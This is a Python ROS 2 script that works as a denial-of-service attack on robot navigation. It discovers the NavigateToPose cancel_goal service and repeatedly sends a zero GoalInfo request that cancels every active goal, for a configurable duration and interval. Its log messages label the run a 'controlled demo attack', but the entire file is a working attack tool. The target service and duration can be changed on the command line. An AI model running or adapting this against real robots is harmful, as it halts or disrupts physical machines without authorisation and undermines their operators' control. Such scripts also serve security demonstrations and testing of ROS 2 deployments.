#!/usr/bin/env python3

import argparse
import time

import rclpy

from action_msgs.msg import GoalInfo
from action_msgs.srv import CancelGoal
from rclpy.node import Node


class NavigationCancelAttack(Node):
    """Repeatedly cancel active NavigateToPose goals for a bounded duration."""

    def __init__(self, service_name: str):
        super().__init__('navigation_cancel_attack')

        self.client = self.create_client(
            CancelGoal,
            service_name,
        )

        self.get_logger().info(
            f'Target cancellation service: {service_name}'
        )

    def wait_for_target(self, timeout_sec: float) -> bool:
        self.get_logger().info(
            'Waiting for NavigateToPose cancellation service...'
        )

        available = self.client.wait_for_service(
            timeout_sec=timeout_sec,
        )

        if available:
            self.get_logger().info(
                'Cancellation service discovered.'
            )
        else:
            self.get_logger().error(
                'Cancellation service was not discovered.'
            )

        return available

    def cancel_all_goals(self, timeout_sec: float = 1.0) -> int:
        request = CancelGoal.Request()

        # A zero UUID and zero timestamp request cancellation of all goals.
        request.goal_info = GoalInfo()

        future = self.client.call_async(request)

        rclpy.spin_until_future_complete(
            self,
            future,
            timeout_sec=timeout_sec,
        )

        if not future.done():
            self.get_logger().warning(
                'Cancellation request timed out.'
            )
            return 0

        response = future.result()

        if response is None:
            self.get_logger().warning(
                'Cancellation service returned no response.'
            )
            return 0

        count = len(response.goals_canceling)

        if count > 0:
            self.get_logger().warning(
                f'Cancellation accepted for {count} goal(s).'
            )
        else:
            self.get_logger().info(
                'No active goal accepted for cancellation.'
            )

        return count


def parse_arguments():
    parser = argparse.ArgumentParser(
        description=(
            'Bounded ROS 2 navigation-cancellation demonstration.'
        )
    )

    parser.add_argument(
        '--duration',
        type=float,
        default=10.0,
        help='Attack duration in seconds. Default: 10.',
    )

    parser.add_argument(
        '--period',
        type=float,
        default=0.5,
        help='Seconds between cancellation attempts. Default: 0.5.',
    )

    parser.add_argument(
        '--discovery-timeout',
        type=float,
        default=10.0,
        help='Service discovery timeout. Default: 10.',
    )

    parser.add_argument(
        '--service',
        default='/navigate_to_pose/_action/cancel_goal',
        help='Target CancelGoal service.',
    )

    return parser.parse_args()


def main():
    args = parse_arguments()

    if args.duration <= 0.0:
        raise SystemExit('--duration must be greater than zero')

    if args.period <= 0.0:
        raise SystemExit('--period must be greater than zero')

    rclpy.init()

    node = NavigationCancelAttack(args.service)

    try:
        if not node.wait_for_target(args.discovery_timeout):
            raise SystemExit(2)

        start_time = time.monotonic()
        deadline = start_time + args.duration
        attempts = 0
        accepted = 0

        node.get_logger().warning(
            'CONTROLLED DEMO ATTACK STARTED: '
            f'cancelling navigation goals for {args.duration:.1f} seconds.'
        )

        while (
            rclpy.ok()
            and time.monotonic() < deadline
        ):
            attempts += 1
            accepted += node.cancel_all_goals()

            remaining = deadline - time.monotonic()

            if remaining > 0.0:
                time.sleep(
                    min(args.period, remaining)
                )

        elapsed = time.monotonic() - start_time

        node.get_logger().warning(
            'CONTROLLED DEMO ATTACK FINISHED: '
            f'elapsed={elapsed:.1f}s, '
            f'attempts={attempts}, '
            f'accepted_cancellations={accepted}.'
        )

    except KeyboardInterrupt:
        node.get_logger().warning(
            'Attack interrupted by operator.'
        )

    finally:
        node.destroy_node()

        if rclpy.ok():
            rclpy.shutdown()


if __name__ == '__main__':
    main()
